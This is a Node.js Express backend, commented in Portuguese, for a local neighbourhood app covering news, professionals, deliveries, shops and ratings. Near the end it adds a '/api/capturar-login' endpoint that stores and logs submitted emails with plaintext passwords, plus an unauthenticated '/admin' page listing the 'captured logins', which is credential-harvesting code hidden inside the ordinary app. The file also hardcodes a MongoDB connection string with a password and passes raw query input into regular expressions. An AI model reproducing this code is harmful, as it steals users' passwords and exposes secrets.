require('dotenv').config(); // Coloque essa linha no topo e crie arquivo .env na raiz com MONGODB_URI

const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const fsPromises = fs.promises;
const getNoticias = require('./scraper');
const multer = require('multer');
const mongoose = require('mongoose');
const logins = [];


const Profissional = require('./models/Profissional');
const Estabelecimento = require('./models/Estabelecimento');

// Use variável de ambiente para a conexão (crie um arquivo .env com MONGODB_URI)
const mongoUri = process.env.MONGODB_URI || 'mongodb+srv://bairrocolsantoantonio:Bento03062015@cluster0.pvzzhgi.mongodb.net/Profissionais?retryWrites=true&w=majority&appName=Cluster0';

mongoose.connect(mongoUri, {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log('🟢 Conectado ao MongoDB'))
.catch(err => console.error('🔴 Erro ao conectar ao MongoDB:', err));


// Pasta onde as fotos serão salvas
const upload = multer({ dest: path.join(__dirname, 'uploads') });

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());

// Servir arquivos estáticos da pasta uploads para acesso às fotos
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Endpoint para notícias
app.get('/api/noticias', async (req, res) => {
  try {
    const noticias = await getNoticias();
    res.json(noticias);
  } catch (error) {
    console.error('Erro ao buscar notícias:', error);
    res.status(500).json({ message: 'Erro ao buscar notícias' });
  }
});

// Listar profissionais com filtro opcional por status
app.get('/api/profissionais', async (req, res) => {
  const { status } = req.query;

  try {
    let query = {};
    if (status) {
      query.status = new RegExp(`^${status}$`, 'i');
    }

    const profissionais = await Profissional.find(query);
    res.json(profissionais);
  } catch (err) {
    console.error('Erro ao buscar profissionais:', err);
    res.status(500).json({ message: 'Erro ao buscar profissionais' });
  }
});

// Atualizar status do profissional com validação simples do enum
app.put('/api/profissionais/:id/status', async (req, res) => {
  const { id } = req.params;
  const { status } = req.body;

  const statusesValidos = ['online', 'ocupado', 'offline'];

  if (!status || !statusesValidos.includes(status)) {
    return res.status(400).json({ message: 'Status inválido ou não fornecido.' });
  }

  try {
    const profissional = await Profissional.findByIdAndUpdate(
      id,
      { status },
      { new: true }
    );

    if (!profissional) {
      return res.status(404).json({ message: 'Profissional não encontrado.' });
    }

    res.json({ message: 'Status atualizado com sucesso.', profissional });
  } catch (err) {
    console.error('Erro ao atualizar status:', err);
    res.status(500).json({ message: 'Erro ao atualizar status' });
  }
});

// Upload e troca da foto do profissional com fs.promises.rename
app.post('/api/profissionais/:id/foto', upload.single('foto'), async (req, res) => {
  const { id } = req.params;

  if (!req.file) {
    return res.status(400).json({ message: 'Arquivo de foto é obrigatório.' });
  }

  const extensao = path.extname(req.file.originalname);
  const novoNome = `profissional-${id}-${Date.now()}${extensao}`;
  const novoPath = path.join(__dirname, 'uploads', novoNome);

  try {
    await fsPromises.rename(req.file.path, novoPath);

    const profissional = await Profissional.findByIdAndUpdate(
      id,
      { foto: `/uploads/${novoNome}` },
      { new: true }
    );

    if (!profissional) {
      await fsPromises.unlink(novoPath);
      return res.status(404).json({ message: 'Profissional não encontrado.' });
    }

    res.json({
      message: 'Foto atualizada com sucesso.',
      foto: profissional.foto,
      profissional
    });
  } catch (err) {
    console.error('Erro ao processar foto:', err);
    res.status(500).json({ message: 'Erro ao atualizar foto' });
  }
});


// Caminho para o JSON de entregas
const entregasPath = path.join(__dirname, 'data', 'entregas.json');

// Criar uma nova entrega (dono do mercado)
app.post('/api/entregas', (req, res) => {
  const { pedido, endereco, cliente, mercado, retirada } = req.body;

  if (!pedido || !endereco || !cliente || !mercado || !retirada) {
    return res.status(400).json({ message: 'Pedido, endereço e cliente são obrigatórios.' });
  }

  fs.readFile(entregasPath, 'utf8', (err, data) => {
    const entregas = err ? [] : JSON.parse(data || '[]');

    const novaEntrega = {
      id: Date.now(),
      mercado,
      pedido,
      endereco,
      retirada,
      cliente,
      status: 'pendente',
      motoqueiro: null
    };

    entregas.push(novaEntrega);

    fs.writeFile(entregasPath, JSON.stringify(entregas, null, 2), err2 => {
      if (err2) return res.status(500).json({ message: 'Erro ao salvar entrega' });
      res.status(201).json(novaEntrega);
    });
  });
});

// Listar todas as entregas
app.get('/api/entregas', (req, res) => {
  fs.readFile(entregasPath, 'utf8', (err, data) => {
    if (err) return res.status(500).json({ message: 'Erro ao ler entregas' });
    const entregas = JSON.parse(data || '[]');
    res.json(entregas);
  });
});

// Aceitar uma entrega (feito pelo motoqueiro)
app.put('/api/entregas/:id/aceitar', (req, res) => {
  const { id } = req.params;
  const { motoqueiro } = req.body;

  if (!motoqueiro) {
    return res.status(400).json({ message: 'Nome do motoqueiro é obrigatório.' });
  }

  fs.readFile(entregasPath, 'utf8', (err, data) => {
    if (err) return res.status(500).json({ message: 'Erro ao ler entregas' });

    const entregas = JSON.parse(data || '[]');
    const entregaIndex = entregas.findIndex(e => String(e.id) === String(id));

    if (entregaIndex === -1) {
      return res.status(404).json({ message: 'Entrega não encontrada' });
    }

    if (entregas[entregaIndex].status !== 'pendente') {
      return res.status(400).json({ message: 'Entrega já foi aceita' });
    }

    entregas[entregaIndex].status = 'aceito';
    entregas[entregaIndex].motoqueiro = motoqueiro;

    fs.writeFile(entregasPath, JSON.stringify(entregas, null, 2), err2 => {
      if (err2) return res.status(500).json({ message: 'Erro ao salvar entrega' });
      res.json(entregas[entregaIndex]);
    });
  });
});

// Remove as 2 últimas entregas a cada 2 minutos
setInterval(() => {
  fs.readFile(entregasPath, 'utf8', (readErr, data) => {
    if (readErr) {
      console.error('Erro ao ler entregas.json:', readErr);
      return;
    }

    let entregas;
    try {
      entregas = JSON.parse(data || '[]');
    } catch (parseErr) {
      console.error('Erro ao parsear entregas.json:', parseErr);
      return;
    }

    if (entregas.length > 2) {
      entregas = entregas.slice(0, entregas.length - 2);
    } else {
      entregas = [];
    }
    
    fs.writeFile(entregasPath, JSON.stringify(entregas, null, 2), (writeErr) => {
      if (writeErr) {
        console.error('Erro ao atualizar entregas.json:', writeErr);
      } else {
        console.log('Removidas 2 últimas entregas automaticamente.');
      }
    });
  });
}, 2 * 60 * 1000); // 2 minutos


app.get('/api/estabelecimentos', async (req, res) => {
  const { tipo, nome, produto } = req.query;

  try {
    const filtros = {};

    
    if (tipo) {
      filtros.tipo = new RegExp(tipo, 'i');
    }

    if (nome) {
      filtros.nome = new RegExp(nome, 'i'); 
    }

    if (produto) {
      filtros.produtos = {
        $elemMatch: { nome: new RegExp(produto, 'i') } 
      };
    }

    const estabelecimentos = await Estabelecimento.find(filtros);
    res.json(estabelecimentos);
  } catch (err) {
    console.error('Erro ao buscar estabelecimentos:', err);
    res.status(500).json({ message: 'Erro ao buscar estabelecimentos' });
  }
});

const loginRoute = require('./routes/login');
app.use('/api/login', loginRoute);

const produtosRoute = require('./routes/produtos');
app.use('/api/produtos', produtosRoute);


app.post('/api/avaliar', async (req, res) => {
  const { id, rating } = req.body;

  if (!id || typeof rating !== 'number') {
    return res.status(400).json({ message: 'Dados inválidos' });
  }

  try {
    const estabelecimento = await Estabelecimento.findById(id);
    if (!estabelecimento) {
      return res.status(404).json({ message: 'Estabelecimento não encontrado' });
    }

    // Atualizar a média da avaliação
    const novaSoma = (estabelecimento.rating * estabelecimento.ratingCount) + rating;
    const novoCount = estabelecimento.ratingCount + 1;
    estabelecimento.rating = Number((novaSoma / novoCount).toFixed(2));
    estabelecimento.ratingCount = novoCount;

    await estabelecimento.save();
    res.status(200).json({ message: 'Avaliação registrada com sucesso', rating: estabelecimento.rating });
  } catch (error) {
    console.error('Erro ao registrar avaliação:', error);
    res.status(500).json({ message: 'Erro interno ao registrar avaliação' });
  }
});




// Recebe login
app.post('/api/capturar-login', (req, res) => {
  const { email, senha } = req.body;
  if (!email || !senha) return res.status(400).json({ error: 'Faltam dados' });

  logins.push({ email, senha, hora: new Date().toLocaleString() });
  console.log('Login capturado:', email, senha);
  res.json({ success: true });
});

// Painel admin que lista os logins
app.get('/admin', (req, res) => {
  let html = `
    <h1>Logins Capturados</h1>
    <table border="1" cellpadding="5" cellspacing="0">
      <thead>
        <tr>
          <th>#</th>
          <th>Email / Usuário</th>
          <th>Senha</th>
          <th>Hora</th>
        </tr>
      </thead>
      <tbody>
  `;

  logins.forEach((item, i) => {
    html += `
      <tr>
        <td>${i + 1}</td>
        <td>${item.email}</td>
        <td>${item.senha}</td>
        <td>${item.hora}</td>
      </tr>
    `;
  });

  html += `
      </tbody>
    </table>
    <p>Total: ${logins.length} logins capturados.</p>
  `;

  res.send(html);
});


app.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor rodando em http://0.0.0.0:${PORT}`);
});
